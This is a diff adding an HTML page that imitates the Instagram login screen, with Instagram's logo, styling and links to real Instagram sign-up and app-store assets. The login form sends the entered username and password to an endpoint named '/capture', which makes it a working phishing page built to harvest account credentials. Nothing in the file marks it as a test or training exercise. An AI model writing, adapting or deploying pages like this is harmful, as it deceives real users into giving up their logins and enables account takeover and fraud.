@@ -1,0 +1,91 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Instagram</title>
+<style>
+  *{margin:0;padding:0;box-sizing:border-box}
+  body{background:#fafafa;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif;display:flex;flex-direction:column;align-items:center;justify-content:center;min-height:100vh;padding:20px}
+  .wrap{display:flex;gap:32px;align-items:center;max-width:900px;width:100%}
+  .phone-mock{width:380px;display:none}
+  @media(min-width:768px){.phone-mock{display:block}}
+  .phone-mock img{width:100%}
+  .forms{display:flex;flex-direction:column;gap:10px;width:350px}
+  .card{background:#fff;border:1px solid #dbdbdb;border-radius:1px;padding:40px;text-align:center}
+  .ig-logo{margin-bottom:28px;display:flex;justify-content:center}
+  .ig-logo svg{height:52px}
+  .divider{display:flex;align-items:center;gap:16px;margin:16px 0;font-size:.8125rem;color:#8e8e8e;font-weight:600}
+  .divider::before,.divider::after{content:'';flex:1;height:1px;background:#dbdbdb}
+  .field{margin-bottom:8px;position:relative}
+  .field input{
+    width:100%;background:#fafafa;border:1px solid #dbdbdb;border-radius:3px;
+    padding:7px 8px;font-size:.75rem;outline:none;color:#262626;
+    font-family:inherit;height:38px
+  }
+  .field input:focus{border-color:#a8a8a8}
+  .field input::placeholder{color:#8e8e8e}
+  .pw-wrap{position:relative}
+  .show-btn{
+    position:absolute;right:8px;top:50%;transform:translateY(-50%);
+    font-size:.875rem;font-weight:600;color:#262626;cursor:pointer;
+    background:none;border:none;font-family:inherit
+  }
+  .btn{
+    width:100%;background:#0095f6;color:#fff;border:none;border-radius:8px;
+    padding:7px;font-size:.875rem;font-weight:700;cursor:pointer;
+    font-family:inherit;margin-top:4px;height:32px
+  }
+  .btn:hover{background:#1877f2}
+  .btn:disabled{opacity:.5;cursor:default}
+  .forgot{display:block;font-size:.75rem;color:#00376b;text-decoration:none;margin-top:14px}
+  .forgot:hover{text-decoration:underline}
+  .card2{background:#fff;border:1px solid #dbdbdb;padding:16px;text-align:center;font-size:.875rem}
+  .card2 a{color:#0095f6;font-weight:600;text-decoration:none}
+  .card2 a:hover{text-decoration:underline}
+  .app-links{text-align:center;margin-top:16px;font-size:.875rem;color:#262626}
+  .app-links p{margin-bottom:12px}
+  .app-links img{height:40px;margin:0 4px}
+</style>
+</head>
+<body>
+<div class="wrap">
+  <div class="forms">
+    <div class="card">
+      <div class="ig-logo">
+        <svg viewBox="0 0 135 52" xmlns="http://www.w3.org/2000/svg" fill="#262626">
+          <path d="M11.2 0C4.3 0 0 4.4 0 11v30c0 6.6 4.3 11 11.2 11 6.8 0 11.2-4.4 11.2-11V11C22.4 4.4 18.1 0 11.2 0zm5.5 41c0 3.1-2.3 5.3-5.5 5.3S5.7 44.1 5.7 41V11c0-3.1 2.3-5.3 5.5-5.3S16.7 7.9 16.7 11v30z"/>
+          <path d="M47.8 14.7c-3.6 0-6.6 1.3-8.8 3.5V15.5H33.2V52h5.8V32.9c0-5.2 3.4-8.5 8.2-8.5 4.7 0 7.5 2.9 7.5 7.8V52h5.8V32c0-10.5-5.5-17.3-12.7-17.3z"/>
+          <path d="M87.4 15.5v3c-2.4-2.4-5.8-3.8-9.7-3.8C68 14.7 61 22 61 33.3c0 11.2 7 18.6 16.7 18.6 3.9 0 7.3-1.4 9.7-3.8v3h5.8V15.5h-5.8zm-9 31.5c-6.4 0-11-5-11-13.7 0-8.8 4.6-13.7 11-13.7 6.5 0 11 5 11 13.7 0 8.7-4.5 13.7-11 13.7z"/>
+          <path d="M113.2 14.7c-11.4 0-18.6 7.5-18.6 18.7 0 11 7.3 18.5 18.7 18.5 6.6 0 12-2.8 15.3-7.5l-4.7-3c-2.3 3.2-5.9 5-10.6 5-6.7 0-11.4-4-12.4-10.5h28.9c.1-.9.2-1.8.2-2.7 0-11-7.1-18.5-16.8-18.5zm-11.8 15.4c1.2-6.1 5.3-9.8 11.5-9.8 5.9 0 10 3.7 10.9 9.8h-22.4z"/>
+        </svg>
+      </div>
+      <form method="POST" action="/capture" autocomplete="on">
+        <div class="field">
+          <input name="email" type="text" placeholder="Phone number, username, or email" required autocomplete="username">
+        </div>
+        <div class="field pw-wrap">
+          <input name="password" id="pw" type="password" placeholder="Password" required autocomplete="current-password">
+          <button type="button" class="show-btn" onclick="var i=document.getElementById('pw');i.type=i.type==='password'?'text':'password';this.textContent=i.type==='password'?'Show':'Hide'">Show</button>
+        </div>
+        <button class="btn" type="submit">Log in</button>
+      </form>
+      <div class="divider">OR</div>
+      <a href="#" style="font-size:.875rem;color:#385185;font-weight:600;text-decoration:none;display:flex;align-items:center;justify-content:center;gap:8px">
+        <svg height="16" viewBox="0 0 24 24" fill="#385185"><path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/></svg>
+        Log in with Facebook
+      </a>
+      <a href="#" class="forgot">Forgot password?</a>
+    </div>
+    <div class="card2">
+      Don't have an account? <a href="https://www.instagram.com/accounts/emailsignup/">Sign up</a>
+    </div>
+    <div class="app-links">
+      <p>Get the app.</p>
+      <img src="https://static.cdninstagram.com/rsrc.php/v3/yz/r/c5Rp7Ym-Klz.png" alt="App Store">
+      <img src="https://static.cdninstagram.com/rsrc.php/v3/yz/r/EHY6QnZYdNX.png" alt="Google Play">
+    </div>
+  </div>
+</div>
+</body>
+</html>
